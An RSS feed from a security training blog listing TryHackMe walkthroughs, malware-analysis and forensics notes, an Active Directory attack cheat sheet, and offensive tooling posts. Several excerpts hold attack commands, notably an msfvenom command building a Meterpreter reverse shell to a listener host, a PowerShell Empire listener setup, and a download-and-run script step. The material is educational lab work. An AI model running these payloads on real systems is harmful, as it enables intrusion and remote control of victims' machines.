<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Classroom</title><link>https://classroom.anir0y.in/post/</link><description>Recent content in Posts on Classroom</description><generator>Hugo -- gohugo.io</generator><language>en</language><copyright>YOU CAN RESUE MY CONTENT</copyright><lastBuildDate>Mon, 19 Jul 2021 22:32:49 +0530</lastBuildDate><atom:link href="https://classroom.anir0y.in/post/index.xml" rel="self" type="application/rss+xml"/><item><title>TryHackMe Simple CTF</title><link>https://classroom.anir0y.in/post/tryhackme-easyctf/</link><pubDate>Mon, 19 Jul 2021 22:32:49 +0530</pubDate><guid>https://classroom.anir0y.in/post/tryhackme-easyctf/</guid><description>OverView Simple CTF room Simple CTF Task 01: Simple CTF How many services are running under port 1000? recon nmap
sudo nmap -p 0-999 10.10.38.103 -v -oN 1000-port Starting Nmap 7.60 ( https://nmap.org ) at 2021-07-19 18:14 BST Initiating ARP Ping Scan at 18:14 Scanning 10.10.38.103 [1 port] Completed ARP Ping Scan at 18:14, 0.</description></item><item><title>TryHackMe RazorBlack</title><link>https://classroom.anir0y.in/post/tryhackme-raz0rblack/</link><pubDate>Sun, 18 Jul 2021 19:31:05 +0530</pubDate><guid>https://classroom.anir0y.in/post/tryhackme-raz0rblack/</guid><description>Overview RazorBlack Room Task 01 These guys call themselves hackers. Can you show them who&amp;rsquo;s the boss ??
Task 02: Flag Submission Panel What is the Domain Name? nmap
sudo nmap -sV -sC -oN nmap/init 10.10.149.120 # Nmap 7.91 scan initiated Sun Jul 18 19:35:34 2021 as: nmap -sV -sC -oN nmap/init 10.10.149.120 Nmap scan report for 10.</description></item><item><title>TryHackMe Linux Function Hooking</title><link>https://classroom.anir0y.in/post/tryhackme-linuxfunctionhooking/</link><pubDate>Sun, 18 Jul 2021 02:30:10 +0530</pubDate><guid>https://classroom.anir0y.in/post/tryhackme-linuxfunctionhooking/</guid><description>OverView Linux Function Hooking room task 01: Introduction In this room, we will be looking into what are Shared Libraries, what is Function Hooking and how we can leverage LD_PRELOAD to do the same! I have tried to keep this room as simple as possible, however some basic understanding of C will be definitely useful!
task 02: What are Shared Libraries?</description></item><item><title>TryHackMe Ffuf</title><link>https://classroom.anir0y.in/post/tryhackme-ffuf/</link><pubDate>Sat, 17 Jul 2021 02:49:02 +0530</pubDate><guid>https://classroom.anir0y.in/post/tryhackme-ffuf/</guid><description>overview fuff room Link task 01: Introduction Summary ffuf stands for Fuzz Faster U Fool. It&amp;rsquo;s a tool used for web enumeration, fuzzing, and directory brute forcing.
Install ffuf ffuf is already included in the following Linux distributions:
BlackArch Pentoo Kali Parrot Install SecLists SecLists is a collection of multiple types of lists used during security assessments.</description></item><item><title>Try Hack Me Web Scanning</title><link>https://classroom.anir0y.in/post/tryhackme-rpwebscanning/</link><pubDate>Wed, 14 Jul 2021 14:00:45 +0530</pubDate><guid>https://classroom.anir0y.in/post/tryhackme-rpwebscanning/</guid><description>Overview Learn the basics of automated web scanning!
Web scanning represents one of the core constructs of modern pen testing. Quite simply, most of what we interact with on a daily basis is the internet, and therein there is a multitude of ever-widening number of vulnerabilities. Within this room, we will investigate two of the most common scanners: Nikto and Zap.
Web Scanning Solved by @anir0y Task 01: Pull the lever, Kronk Task 02: &amp;hellip;I&amp;rsquo;m supposed to scan with that?</description></item><item><title>Awesome Red Teaming</title><link>https://classroom.anir0y.in/post/post-awesome-red-teaming/</link><pubDate>Tue, 13 Jul 2021 14:37:01 +0530</pubDate><guid>https://classroom.anir0y.in/post/post-awesome-red-teaming/</guid><description>Awesome Red Teaming List of Awesome Red Team / Red Teaming Resources
This list is for anyone wishing to learn about Red Teaming but do not have a starting point.
Anyway, this is a living resources and will update regularly with latest Adversarial Tactics and Techniques based on Mitre ATT&amp;amp;CK
You can help by sending Pull Requests to add more information.
Table of Contents Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Exfiltration Command and Control Embedded and Peripheral Devices Hacking Misc RedTeam Gadgets Ebooks Training Certification</description></item><item><title>TryHackMe The find command</title><link>https://classroom.anir0y.in/post/tryhackme-thefindcommand/</link><pubDate>Mon, 12 Jul 2021 23:17:35 +0530</pubDate><guid>https://classroom.anir0y.in/post/tryhackme-thefindcommand/</guid><description>Overview The find command Solved by @anir0y Task 01: Start finding Task 02: Be more specific Most of the time, you won’t be looking for something in your working directory. The first argument of your find command should be the directory you want to search. The command will search in that directory and in all its subdirectories.</description></item><item><title>TryHackMe Tmux</title><link>https://classroom.anir0y.in/post/tryhackme-rptmux/</link><pubDate>Sun, 11 Jul 2021 13:50:48 +0530</pubDate><guid>https://classroom.anir0y.in/post/tryhackme-rptmux/</guid><description>Overview Room Name tmux Dev @anir0y [Task 1] Screens wishes it was cool tmux, the terminal multiplexer, is easily one of the most used tools by the Linux community (and not just pentesters!). While not a malicious tool, tmux makes running simultaneous tasks throughout a pentest incredibly easy. In this primer room, we&amp;rsquo;ll walk through the process of installing and using some of the most common key combinations used in tmux.</description></item><item><title>TryHackMe Crisis</title><link>https://classroom.anir0y.in/post/tryhackme-crisis/</link><pubDate>Sat, 10 Jul 2021 15:18:30 +0530</pubDate><guid>https://classroom.anir0y.in/post/tryhackme-crisis/</guid><description>Overview Room Name Crisis Dev @anir0y Tools required Wireshark Join Room Crisis Task 01: Introduction Download the File open with Wireshark 1.1 Download file.
1.2 When it all started?
Open packet 1, layer 1 reavels the Time Stamp
Enter Format (MMM DD, YYYY)
1.</description></item><item><title>TryHackMe Couch</title><link>https://classroom.anir0y.in/post/tryhackme-couch/</link><pubDate>Fri, 09 Jul 2021 19:22:00 +0530</pubDate><guid>https://classroom.anir0y.in/post/tryhackme-couch/</guid><description>Couch Flags Task Remarks 1.1 flag Recon running nmap: (Default)
┌──(anir0y㉿kali)-[~/share/thm/room/couch] └─$ sudo nmap -sC -sV -oN nmap/couch 10.10.94.40 [sudo] password for anir0y: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 19:26 IST Nmap scan report for 10.10.94.40 Host is up (0.21s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.</description></item><item><title>TryHackMe Inclusion</title><link>https://classroom.anir0y.in/post/tryhackme-inclusion/</link><pubDate>Thu, 08 Jul 2021 14:19:01 +0530</pubDate><guid>https://classroom.anir0y.in/post/tryhackme-inclusion/</guid><description>inclusion task 01: Deploy This is a beginner level room designed for people who want to get familiar with Local file inclusion vulnerability.
Task 02: Root It Recon Nmap nmap found two open TCP ports, SSH (22) and HTTP (80):
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-08 14:35 IST Nmap scan report for 10.10.206.247 Host is up (0.27s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.</description></item><item><title>TryHackMe RootMe</title><link>https://classroom.anir0y.in/post/tryhackme-rrootme/</link><pubDate>Tue, 06 Jul 2021 13:36:08 +0530</pubDate><guid>https://classroom.anir0y.in/post/tryhackme-rrootme/</guid><description>RootMe Task 01: Deploy the Room Task 02: Reconnaissance 2.1 Scan the machine, how many ports are open?
run the command: nmap -sC -sV -oN nmap MACHINE_IP
2.2 What version of Apache is running?
Ans is in task 2.1 output result. use cat nmap to see the output file.
2.3 Find directories on the web server using the GoBuster tool.
gobuster dir -u 10.10.71.82 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
2.4 What is the hidden directory?</description></item><item><title>TryHackMe Gitandcrumpets</title><link>https://classroom.anir0y.in/post/tryhackme-gitandcrumpets/</link><pubDate>Sun, 04 Jul 2021 23:04:02 +0530</pubDate><guid>https://classroom.anir0y.in/post/tryhackme-gitandcrumpets/</guid><description>Git and Crumpets Our devs have been clamoring for some centralized version control, so the admin came through. Rumour has it that they included a few countermeasures&amp;hellip;
Task 01: Start the VM Task 02: Git the flags user I tried running nmap, no luck
being impatatient, I ran a quick curl commnad curl -s 10.10.x.y to see what&amp;rsquo;s up.
got this output.
let&amp;rsquo;s setup DNS record, edit /etc/hosts file.</description></item><item><title>TryHackMe Postexploit</title><link>https://classroom.anir0y.in/post/tryhackme-postexploit/</link><pubDate>Sun, 04 Jul 2021 14:36:48 +0530</pubDate><guid>https://classroom.anir0y.in/post/tryhackme-postexploit/</guid><description>Post-Exploitation Basics Learn the basics of post-exploitation and maintaining access with mimikatz, bloodhound, powerview and msfvenom
Task 01: Introduction This room will be related to very real world applications and will most likely not help with any ctfs however this room will give you great starting knowledge of how to approach a network after you have gained a shell on a machine.
Task 02: Enumeration w/ Powerview Powerview is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system.</description></item><item><title>TryHackMe Hydra</title><link>https://classroom.anir0y.in/post/tryhackme-hydra/</link><pubDate>Sat, 03 Jul 2021 20:14:32 +0530</pubDate><guid>https://classroom.anir0y.in/post/tryhackme-hydra/</guid><description>Hydra Learn about and use Hydra, a fast network logon cracker, to bruteforce and obtain a website&amp;rsquo;s credentials.
Task 01: Hydra Introduction Hydra is a brute force online password cracking program; a quick system login password &amp;lsquo;hacking&amp;rsquo; tool.
Installing Hydra If you&amp;rsquo;re using Kali Linux, hydra is pre-installed. Otherwise you can download it here: https://github.com/vanhauser-thc/thc-hydra
Task 02: Using Hydra Hydra Commands The options we pass into Hydra depends on which service (protocol) we&amp;rsquo;re attacking.</description></item><item><title>python pip2 Install</title><link>https://classroom.anir0y.in/post/pip2-install/</link><pubDate>Sat, 03 Jul 2021 01:30:12 +0530</pubDate><guid>https://classroom.anir0y.in/post/pip2-install/</guid><description>PIP 2 installation in last few weeks I&amp;rsquo;ve seen people are asking for how to install pip2 in latest Kali linux, here is the answer. once installation is done, you can find it as pip2 and then you can use it to install pip2 i.e. python 2.7 modules.
how to? download the script and run here is how:
wget https://gist.githubusercontent.com/anir0y/a20246e26dcb2ebf1b44a0e1d989f5d1/raw/a9908e5dd147f0b6eb71ec51f9845fafe7fb8a7f/pip2%2520install -O run.sh chmod +x run.sh #wget will save the output as run.</description></item><item><title>TryHackMe Room Ice</title><link>https://classroom.anir0y.in/post/thm-room-ice/</link><pubDate>Tue, 29 Jun 2021 14:11:50 +0530</pubDate><guid>https://classroom.anir0y.in/post/thm-room-ice/</guid><description>ICE Deploy &amp;amp; hack into a Windows machine, exploiting a very poorly secured media server.
task 01: Connect Nothing to do just follow the instructions.
Task 02: Recon Things you should know https://nmap.org/book/synscan.html https://nmap.org/book/man-port-scanning-techniques.html for this lab: nmap -sS -p- TARGET_IP
task 2.1 Deploy the machine! This may take up to three minutes to start.
Task 2.2 Launch a scan against our target machine, I recommend using a SYN scan set to scan all ports on the machine.</description></item><item><title>TryHackMe Room Hackpark</title><link>https://classroom.anir0y.in/post/thm-room-hackpark/</link><pubDate>Sat, 19 Jun 2021 19:38:27 +0530</pubDate><guid>https://classroom.anir0y.in/post/thm-room-hackpark/</guid><description>HackPark Room link : HackPark
task 01: Deploy the vulnerable Windows machine This room will cover brute-forcing an accounts credentials, handling public exploits, using the Metasploit framework and privilege escalation on Windows.
Flags Flag-ID question 1 Deploy the machine and access its web server. 2 Whats the name of the clown displayed on the homepage? download the img and do a reverse Image search ans is PENNYWISE task 02: Using Hydra to brute-force a login 1 : find the directory using gobuster</description></item><item><title>TryHackME Room Kenobi</title><link>https://classroom.anir0y.in/post/thm-room-kenobi/</link><pubDate>Thu, 10 Jun 2021 21:22:32 +0530</pubDate><guid>https://classroom.anir0y.in/post/thm-room-kenobi/</guid><description>kenobi Task 01 : Deploy the vulnerable machine Flag-ID question 1 Make sure you&amp;rsquo;re connected to our network and deploy the machine 2 Scan the machine with nmap, how many ports are open? Task 02: Enumerating Samba for shares cheat sheet nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse [IP] smbclient //&amp;lt;ip&amp;gt;/anonymous smbget -R smb://&amp;lt;ip&amp;gt;/anonymous #recursive download files nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.</description></item><item><title>TryHackMe Room Vulnversity</title><link>https://classroom.anir0y.in/post/thm-room-vulnversity/</link><pubDate>Wed, 09 Jun 2021 20:10:48 +0530</pubDate><guid>https://classroom.anir0y.in/post/thm-room-vulnversity/</guid><description>Vulnversity TASK 01: Deploy the machine TASK 02: Reconnaissance Tools
Nmap CheatSheet Flags Flag ID Questions 1 There are many nmap &amp;ldquo;cheatsheets&amp;rdquo; online that you can use too. N\A 2 Scan the box, how many ports are open? 3 What version of the squid proxy is running on the machine?</description></item><item><title>Thm Room Web Fundamentals</title><link>https://classroom.anir0y.in/post/thm-room-webfundamentals/</link><pubDate>Tue, 08 Jun 2021 11:04:18 +0530</pubDate><guid>https://classroom.anir0y.in/post/thm-room-webfundamentals/</guid><description>Web Fundamentals Task 01: Introduction and objectives Flags 1: n/a Task 02: How do we load websites? Flags 2 Flag ID Questions Ans 1 What request verb is used to retrieve page content? GET 2 What port do web servers normally listen on? 80 3 What&amp;rsquo;s responsible for making websites look fancy? CSS Task 03: More HTTP - Verbs and request formats HTTP response status codes</description></item><item><title>Backdooring EXE Files</title><link>https://classroom.anir0y.in/post/cs-hijackputty-msfvenom/</link><pubDate>Mon, 07 Jun 2021 20:20:16 +0530</pubDate><guid>https://classroom.anir0y.in/post/cs-hijackputty-msfvenom/</guid><description>Backdooring EXE Files overview Creating customized backdoored executables often took a long period of time to do manually as attackers. The ability to embed a Metasploit Payload in any executable that you want is simply brilliant. When we say any executable, it means any executable. You want to backdoor something you download from the internet? How about iexplorer? Or explorer.exe or putty, any of these would work. The best part about it is its extremely simple.</description></item><item><title>TryHackMe Writeup REMnux - The Redux</title><link>https://classroom.anir0y.in/post/thm-room-malremnuxv2/</link><pubDate>Tue, 01 Jun 2021 09:49:05 +0530</pubDate><guid>https://classroom.anir0y.in/post/thm-room-malremnuxv2/</guid><description>REMnux - The Redux Profile Support var aax_size='300x250'; var aax_pubname = 'anir0y-21'; var aax_src='302'; Task 01: introduction Welcome to the redux of REMnux.
Since the release of the previous REMnux room, REMnux has had substantial changes, rendering the previous room outdated and impossible to complete.
I have taken the opportunity to recreate the room covering REMnux from scratch, taking a very different approach to ensure you get to use all the facilities that make REMnux unique.</description></item><item><title>TryHackMe BasicMalwareRE Writeup</title><link>https://classroom.anir0y.in/post/thm-room-basicmalwarere/</link><pubDate>Mon, 31 May 2021 08:20:27 +0530</pubDate><guid>https://classroom.anir0y.in/post/thm-room-basicmalwarere/</guid><description>BasicMalwareRE Profile Support I learnt from this Book: Practical Malware Analysis: The Hands-On Guide to Dissecting Malicious Software Task 01: Introduction These challenges are aimed towards learning about the &amp;ldquo;Static Analysis&amp;rdquo; technique used to analyze the malware. The main aim for this room is not to used any types of debuggers neither the executable&amp;rsquo;s/programs should be run on any platform.</description></item><item><title>Try Hack ME Room Malstrings</title><link>https://classroom.anir0y.in/post/thm-room-malstrings/</link><pubDate>Mon, 31 May 2021 00:21:19 +0530</pubDate><guid>https://classroom.anir0y.in/post/thm-room-malstrings/</guid><description>MAL: Strings Profile Support var aax_size='300x250'; var aax_pubname = 'anir0y-21'; var aax_src='302'; Task 01: What are &amp;ldquo;strings&amp;rdquo;? MP: Strings What are &amp;ldquo;strings&amp;rdquo;? From a programming perspective, &amp;ldquo;strings&amp;rdquo; is the term given for data handled by an application. At a broader view, these pieces of data are used to store information such as text to numerical values.</description></item><item><title>Try Hack ME Room Malware Introductory</title><link>https://classroom.anir0y.in/post/thm-room-malmalintroductory/</link><pubDate>Sat, 29 May 2021 00:08:19 +0530</pubDate><guid>https://classroom.anir0y.in/post/thm-room-malmalintroductory/</guid><description>MAL: Malware Introductory Profile Support var aax_size='300x250'; var aax_pubname = 'anir0y-21'; var aax_src='302'; Task 01: What is the Purpose of Malware Analysis? Malware is such a prevalent topic within Cybersecurity, and often an unfortunately recurring theme among global news today.
Not only is malware analysis a form of incidence response, but it is also useful in understanding how the behaviours of variants of malware result in their respective categorisation.</description></item><item><title>Try Hack Me Room History of Malware</title><link>https://classroom.anir0y.in/post/thm-room-historyofmalware/</link><pubDate>Fri, 28 May 2021 00:43:47 +0530</pubDate><guid>https://classroom.anir0y.in/post/thm-room-historyofmalware/</guid><description>History of Malware Join this room to learn about the first forms of malware and how they turned into the malicious code we see today.
Profile Support var aax_size='300x250'; var aax_pubname = 'anir0y-21'; var aax_src='302'; Task 01: Introduction &amp;ldquo;Malware&amp;rdquo; consists of two words combined; malicious and software. Typically, Malware is designed to cause damage to Computers or Networks, this may be on a very large scale or only on a local network (LAN).</description></item><item><title>Thm Room Autopsy</title><link>https://classroom.anir0y.in/post/thm-room-btautopsye0/</link><pubDate>Thu, 27 May 2021 00:31:13 +0530</pubDate><guid>https://classroom.anir0y.in/post/thm-room-btautopsye0/</guid><description>Autopsy Learn how to use Autopsy to investigate artifacts from a disk image. Use your knowledge to investigate an employee who is being accused of leaking private company data.
Profile Support var aax_size='300x250'; var aax_pubname = 'anir0y-21'; var aax_src='302'; Task 01: Introduction What is Autopsy?
The official description: &amp;ldquo;Autopsy is the premier open source forensics platform which is fast, easy-to-use, and capable of analyzing all types of mobile devices and digital media.</description></item><item><title>Investigating Windows</title><link>https://classroom.anir0y.in/post/investigatingwindows/</link><pubDate>Tue, 25 May 2021 20:09:18 +0530</pubDate><guid>https://classroom.anir0y.in/post/investigatingwindows/</guid><description>Investigating Windows A windows machine has been hacked, its your job to go investigate this windows machine and find clues to what the hacker might have done.
Profile Support var aax_size='300x250'; var aax_pubname = 'anir0y-21'; var aax_src='302'; Task 01: Investigating Windows Explanation Flg 2 looking into eventviewer log for EventID 4624. Ref: read
Flag 3 open CMD -&amp;gt; type net user John look for Last Logon</description></item><item><title>Try Hack me Room Volatility</title><link>https://classroom.anir0y.in/post/thm-room-bpvolatility/</link><pubDate>Sun, 23 May 2021 23:09:45 +0530</pubDate><guid>https://classroom.anir0y.in/post/thm-room-bpvolatility/</guid><description>Volatility Learn how to perform memory forensics with Volatility!
Profile Support Task 01: Intro Volatility is a free memory forensics tool developed and maintained by Volatility labs. Regarded as the gold standard for memory forensics in incident response, Volatility is wildly expandable via a plugins system and is an invaluable tool for any Blue Teamer.
var aax_size='300x250'; var aax_pubname = 'anir0y-21'; var aax_src='302'; Task 02: Obtaining Memory Samples Obtaining a memory capture from machines can be done in numerous ways, however, the easiest method will often vary depending on what you&amp;rsquo;re working with.</description></item><item><title>Domino’s India Data Leak Of 18 Cr Orders Resurfaces; Customer Location, Mobile Numbers Exposed</title><link>https://classroom.anir0y.in/post/scripts-dominos/</link><pubDate>Sat, 22 May 2021 19:56:16 +0530</pubDate><guid>https://classroom.anir0y.in/post/scripts-dominos/</guid><description>update: Site seems to be down for now!
Domino&amp;rsquo;s India, which is owned by Jubilant FoodWorks has apparently fallen victim to a massive data leak. Hackers have reportedly published crucial data on the dark web. The data contains details of lakhs of Domino&amp;rsquo;s India customers and employees. As per reports, sensitive customer data like names, phone numbers, and credit card details have been accessed by hackers.
Image Credits: Pixabay/Twitter - @dominos_india</description></item><item><title>Try Hack Me Room Attacking Kerberos</title><link>https://classroom.anir0y.in/post/thm-room-attackingkerberos/</link><pubDate>Thu, 20 May 2021 23:25:07 +0530</pubDate><guid>https://classroom.anir0y.in/post/thm-room-attackingkerberos/</guid><description>Attacking Kerberos Profile Support Task 01: Introduction What is Kerberos? - Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more &amp;ldquo;secure&amp;rdquo; than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.</description></item><item><title>Try Hack Me Room Attacktivedirectory</title><link>https://classroom.anir0y.in/post/thm-room-attacktivedirectory/</link><pubDate>Tue, 18 May 2021 23:58:19 +0530</pubDate><guid>https://classroom.anir0y.in/post/thm-room-attacktivedirectory/</guid><description>Attacktivedirectory Profile Support var aax_size='300x250'; var aax_pubname = 'anir0y-21'; var aax_src='302'; Task 01: Deploy The Machine Walkthough how to access VM &amp;amp; Attacker VM
Task 02: Setup Installing Impacket:
Whether you&amp;rsquo;re on the Kali 2019.3 or Kali 2021.1, Impacket can be a pain to install correctly. Here&amp;rsquo;s some instructions that may help you install it correctly!</description></item><item><title>Try Hack Me Room Osquery</title><link>https://classroom.anir0y.in/post/thm-room-osquery/</link><pubDate>Sun, 16 May 2021 23:54:39 +0530</pubDate><guid>https://classroom.anir0y.in/post/thm-room-osquery/</guid><description>Osquery Profile Support TASK 1 : Introduction Osquery is an open-source tool created by Facebook. With Osquery, Security Analysts, Incident Responders, Threat Hunters, etc., can query an endpoint (or multiple endpoints) using SQL syntax. Osquery can be installed on multiple platforms: Windows, Linux, macOS, and FreeBSD.
Many well-known companies, besides Facebook, either use Osquery, utilize osquery within their tools, and/or look for individuals who know Osquery.</description></item><item><title>Try Hack Me Room Room Openvas</title><link>https://classroom.anir0y.in/post/thm-room-openvas/</link><pubDate>Mon, 10 May 2021 01:36:51 +0530</pubDate><guid>https://classroom.anir0y.in/post/thm-room-openvas/</guid><description>OpenVas Room Subscription Only
Task 1: Introduction OpenVAS, an application used to scan endpoints and web applications to identify and detect vulnerabilities. It is commonly used by corporations as part of their mitigation solutions to quickly identify any gaps in their production or even development servers or applications. This is not an end all be all solution but can help to get rid of any common vulnerabilities that may have slipped through the cracks.</description></item><item><title>Try Hack ME Room Zerologon</title><link>https://classroom.anir0y.in/post/thm-room-zerologon/</link><pubDate>Mon, 10 May 2021 01:22:37 +0530</pubDate><guid>https://classroom.anir0y.in/post/thm-room-zerologon/</guid><description>Zero Logon - The Zero Day Angle Room Subscription Only About The vulnerability - On September 14, Secura released a whitepaper for CVE-2020-1472, that allowed an attacker to go from Zero to Domain Admin in approximately one minute. They dubbed this vulnerability Zero Logon.
Zero Logon is a purely statistics based attack that abuses a feature within MS-NRPC (Microsoft NetLogon Remote Protocol), MS-NRPC is a critical authentication component of Active Directory that handles authentication for User and Machine accounts.</description></item><item><title>Cyber Security Interview Questions With Answers</title><link>https://classroom.anir0y.in/post/cyber-security-interview-questions-with-answers/</link><pubDate>Fri, 07 May 2021 19:38:21 +0530</pubDate><guid>https://classroom.anir0y.in/post/cyber-security-interview-questions-with-answers/</guid><description>50 Cyber Security Interview Questions (With Answers) Top Cyber Security Interview Questions Explain Cryptography It is the science of protecting data from third-party using various methods. It is used to protect sensitive information that shouldn’t be disclosed to anyone other than the owners of the information.
Differentiate between Symmetric and Asymmetric encryption Symmetric encryption – In this type of encryption, the same key is used for encryption
and decryption of data.</description></item><item><title>Active Directory Exploitation Cheat Sheet</title><link>https://classroom.anir0y.in/post/active-directory-exploitation-cheat-sheet/</link><pubDate>Fri, 07 May 2021 14:00:36 +0530</pubDate><guid>https://classroom.anir0y.in/post/active-directory-exploitation-cheat-sheet/</guid><description>Active Directory Exploitation Cheat Sheet A cheat sheet that contains common enumeration and attack methods for Windows Active Directory.
This cheat sheet is inspired by the PayloadAllTheThings repo.
Summary Active Directory Exploitation Cheat Sheet Summary Tools Domain Enumeration Using PowerView Using AD Module Using BloodHound Useful Enumeration Tools Local Privilege Escalation Useful Local Priv Esc Tools Lateral Movement Powershell Remoting Remote Code Execution with PS Credentials Import a powershell module and execute its functions remotely Executing Remote Stateful commands Mimikatz Useful Tools Domain Privilege Escalation Kerberoast ASREPRoast Password Spray Attack Force Set SPN Abusing Shadow Copies List and Decrypt Stored Credentials using Mimikatz Unconstrained Delegation Constrained Delegation Resource Based Constrained Delegation DNSAdmins Abuse Abusing Active Directory-Integraded DNS Abusing Backup Operators Group Abusing Exchange Weaponizing Printer Bug Abusing ACLs Abusing IPv6 with mitm6 SID History Abuse Exploiting SharePoint Zerologon Exploit Domain Persistence Golden Ticket Attack DCsync Attack Silver Ticket Attack Skeleton Key Attack DSRM Abuse Custom SSP Cross Forest Attacks Trust Tickets Abuse MSSQL Servers Breaking Forest Trusts Tools Powersploit PowerUpSQL Powermad Impacket Mimikatz Rubeus -&amp;gt; Compiled Version BloodHound AD Module ASREPRoast Domain Enumeration Using PowerView Powerview v.</description></item><item><title>Notes OSIModel Explained</title><link>https://classroom.anir0y.in/post/notes-osimodel-explained/</link><pubDate>Sun, 25 Apr 2021 20:20:59 +0530</pubDate><guid>https://classroom.anir0y.in/post/notes-osimodel-explained/</guid><description>OSI Model Explained Packet Details You can double click on a packet in capture to open its details. Packets consist of 5 to 7 layers based on the OSI model. We will go over all of them in an HTTP packet from a sample capture
Looking above we can see 7 distinct layers to the packet: frame/packet, source [MAC], source [IP], protocol, protocol errors, application protocol, and application data. Below we will go over the layers in more detail.</description></item><item><title>Notes OSIModel</title><link>https://classroom.anir0y.in/post/notes-osimodel/</link><pubDate>Wed, 21 Apr 2021 20:01:52 +0530</pubDate><guid>https://classroom.anir0y.in/post/notes-osimodel/</guid><description>OSI Model OverView The OSI (Open Systems Interconnection) Model is a standardised model which we use to demonstrate the theory behind computer networking. In practice, it&amp;rsquo;s actually the more compact TCP/IP model that real-world networking is based off; however the OSI model, in many ways, is easier to get an initial understanding from.
The OSI model consists of seven layers:
Layers Application presentation session transport Network Data Link Physical There are many mnemonics floating around to help you learn the layers of the OSI model &amp;ndash; search around until you find one that you like.</description></item><item><title>Notes Stego</title><link>https://classroom.anir0y.in/post/notes-stego/</link><pubDate>Wed, 21 Apr 2021 17:47:23 +0530</pubDate><guid>https://classroom.anir0y.in/post/notes-stego/</guid><description>Steganography - A list of useful tools and resources Steganography Steganography is hiding a file or a message inside of another file , there are many fun steganography CTF challenges out there where the flag is hidden in an image , audio file or even other types of files. Here is a list of the most tools I use and some other useful resources.
Note : This list will be updated regularly , feel free to pm if you have any suggestions</description></item><item><title>Forensic Tools</title><link>https://classroom.anir0y.in/post/ref-forensic/</link><pubDate>Tue, 13 Apr 2021 21:15:35 +0530</pubDate><guid>https://classroom.anir0y.in/post/ref-forensic/</guid><description>Forensics Tools A list of free and open source forensics analysis tools and other resources.
Forensics Tools Collections Tools Distributions Frameworks Live forensics Acquisition Imageing Carving Memory Forensics Network Forensics Windows Artifacts NTFS/MFT Processing OS X Forensics Mobile Forensics Docker Forensics Browser Artifacts Timeline Analysis Disk image handling Decryption Management Picture Analysis Steganography Metadata Forensics Website Forensics Learn Forensics CTFs Resources Books File System Corpora Twitter Blogs Other Related Awesome Lists Collections DFIR – The definitive compendium project - Collection of forensic resources for learning and research.</description></item><item><title>Notes Gnupg</title><link>https://classroom.anir0y.in/post/notes-gnupg/</link><pubDate>Tue, 13 Apr 2021 16:57:30 +0530</pubDate><guid>https://classroom.anir0y.in/post/notes-gnupg/</guid><description>How To Use GPG to Encrypt and Sign Messages Introduction GPG, or GNU Privacy Guard, is a public key cryptography implementation. This allows for the secure transmission of information between parties and can be used to verify that the origin of a message is genuine.
In this guide, we will discuss how GPG works and how to implement it. We will be using an Ubuntu 16.04 server for this demonstration, but will include instructions for other distributions as well.</description></item><item><title>Msf Runscript</title><link>https://classroom.anir0y.in/post/msf-runscript/</link><pubDate>Wed, 07 Apr 2021 15:25:21 +0530</pubDate><guid>https://classroom.anir0y.in/post/msf-runscript/</guid><description>WRITING METERPRETER SCRIPTS There are a few things you need to keep in mind when creating a new Meterpreter script.
Not all versions of Windows are the same Some versions of Windows have security countermeasures for some of the commands Not all command line tools are in all versions of Windows Some of the command line tools switches vary depending on the version of Windows For our purposes, we are going to create a stand alone binary that will be run on the target system that will create a reverse Meterpreter shell back to us.</description></item><item><title>Intro Bash</title><link>https://classroom.anir0y.in/post/intro-bash/</link><pubDate>Sat, 03 Apr 2021 18:54:43 +0530</pubDate><guid>https://classroom.anir0y.in/post/intro-bash/</guid><description>Getting started {: .-three-column}
Introduction {: .-intro}
This is a quick reference to getting started with Bash scripting.
Learn bash in y minutes (learnxinyminutes.com) Bash Guide (mywiki.wooledge.org) Example #!/usr/bin/env bash NAME=&amp;#34;John&amp;#34; echo &amp;#34;Hello $NAME!&amp;#34; Variables NAME=&amp;#34;John&amp;#34; echo $NAME echo &amp;#34;$NAME&amp;#34; echo &amp;#34;${NAME}!&amp;#34; String quotes NAME=&amp;#34;John&amp;#34; echo &amp;#34;Hi $NAME&amp;#34; #=&amp;gt; Hi John echo &amp;#39;Hi $NAME&amp;#39; #=&amp;gt; Hi $NAME Shell execution echo &amp;#34;I&amp;#39;m in $(pwd)&amp;#34; echo &amp;#34;I&amp;#39;m in `pwd`&amp;#34; # Same See Command substitution</description></item><item><title>Powershell Empire</title><link>https://classroom.anir0y.in/post/powershell-empire-install/</link><pubDate>Fri, 02 Apr 2021 18:47:08 +0530</pubDate><guid>https://classroom.anir0y.in/post/powershell-empire-install/</guid><description>Prereq install pip3 (python Package installer) sudo apt install python3-pip -y Install Poetry sudo pip3 install poetry install Git sudo apt install git -y Install Powershell - Empire git clone --recursive https://github.com/BC-SECURITY/Empire.git cd Empire sudo ./setup/install.sh sudo poetry install sudo poetry run python empire Hacking generate a listener (http) (Empire) &amp;gt; uselistener http (Empire: listeners/http) &amp;gt; info Name: HTTP[S] Category: client_server Authors: @harmj0y Description: Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach.</description></item><item><title>Msfvenom Psh</title><link>https://classroom.anir0y.in/post/msfvenom-psh/</link><pubDate>Thu, 01 Apr 2021 16:14:32 +0530</pubDate><guid>https://classroom.anir0y.in/post/msfvenom-psh/</guid><description>meterpreter reverse shell with powershell Create Shell root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.6 LPORT=443 -f psh -o meterpreter-64.ps1 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder or badchars specified, outputting raw payload Payload size: 510 bytes Final size of 